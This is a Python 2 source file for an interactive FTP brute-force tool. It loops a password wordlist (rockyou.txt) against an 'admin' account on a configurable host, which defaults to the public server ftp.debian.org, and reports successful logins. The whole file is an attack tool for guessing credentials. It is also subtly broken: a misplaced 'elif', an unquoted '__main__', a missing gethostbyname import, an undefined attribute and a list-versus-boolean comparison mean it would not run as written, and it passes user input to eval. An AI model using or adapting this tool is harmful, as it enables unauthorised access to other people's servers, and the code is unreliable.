import cmd
import ftplib

def getToken(line):
    token = ""
    for letter in line:
        if letter != " ":
            token += letter
        else:
            break
    return token

upmenu = "util"

class bruteMenu(cmd.Cmd):
  def __init__(self):
    cmd.Cmd.__init__(self)
    self.passwdfile = ["rockyou.txt"]
    self.singleUsername = [True]
    self.user = ["admin"]
    self.userfile = ["users.txt"]
    self.host = ["ftp.debian.org"]
  def help_help(self):
    print "Usage: help [cmd]"
    print "cmd    the command to get help on"
    print "help: show help on a command or list commands"
  def do_start(self, args):
      for let in "abcdefghijklmnopqrstuvwxyz":
          if let in self.host[0]:
              self.host[0] = gethostbyname(self.host[0])
      ftp = ftplib.FTP(self.host[0])
      pwdfile = open(self.passwdfile[0], "r")
      if self.singleUsername == True:
          for line in pwdfile.readlines():
              try:
                  ftp.login(self.user[0], line)
                  print "[+]Login succeeded with %s, %s" % (self.user[0], line)
              except:
                  pass
      elif self.singleUsername == False:
          userfile = open(self.userfile[0], "r")
          for line in userfile.readlines():
              for passwd in pwdfile.readlines():
                  try:
                      ftp.login(line, passwd)
                      print "[+]Login succeeded with %s, %s" % (line, passwd)
                  except:
                      pass
      ftp.quit()
  def help_start(self):
    print "Usage: start"
    print "start: start the attempt"
  def do_exit(self, args):
    if args:
      print "*** Argument number: needed 0"
      return
    return True
  def help_exit(self):
    print "Usage: exit"
    print "exit: exit the brute-forcer context"
  def do_show(self, args):
    if args != "options":
      print "*** Unknown argument: " + args
      return
    print "Options for brute:"
    print "========================"
    print "host    " + self.host[0] + "    target's ip" 
    print "pwdfile    " + self.pwdfile[0] + "    password file to try passwords from"
    print "single-username    " + self.singleUsername[0] + "    True/False (use one username)"
    print "user    " + self.user[0] + "    username to crack passwords for"
    print "userfile    " + self.userfile[0] + "    file with usernames in them"
  def help_show(self):
    print "Usage: show options"
    print "show options: show the variables, current values, and descriptions"
  def do_set(self, args):
      var = getToken(args)
      val = args[len(var) + 3:]
      if var == "pwdfile":
          self.passwdfile[0] = val
      elif var == "single-username":
          if eval(val) == True or eval(val) == False:
              self.singleUsername[0] = val
          else:
              print "*** Value not expected type: boolean needed, but found: " + type(eval(val))
              return
      print "[*]%s => %s" % (var, val)
      elif var == "user":
          self.user[0] = val
      elif var == "userfile":
          self.userfile[0] = val
      elif var == "host":
          self.host[0] = val
      else:
          print "*** Variable not found: " + var
          return
  def help_set(self):
      print "Usage: set [var] = [val]"
      print "var    variable to set"
      print "val    value to set variable to"
      print "set: set a variable to a value"
      print "Note: you MUST use it exactly as shown: no set [var]=[val]!"
def main():
    brutemenu = bruteMenu()
    brutemenu.cmdloop("pdf-console " + upmenu + "(brute)% ")
if __name__ == __main__:
    main()
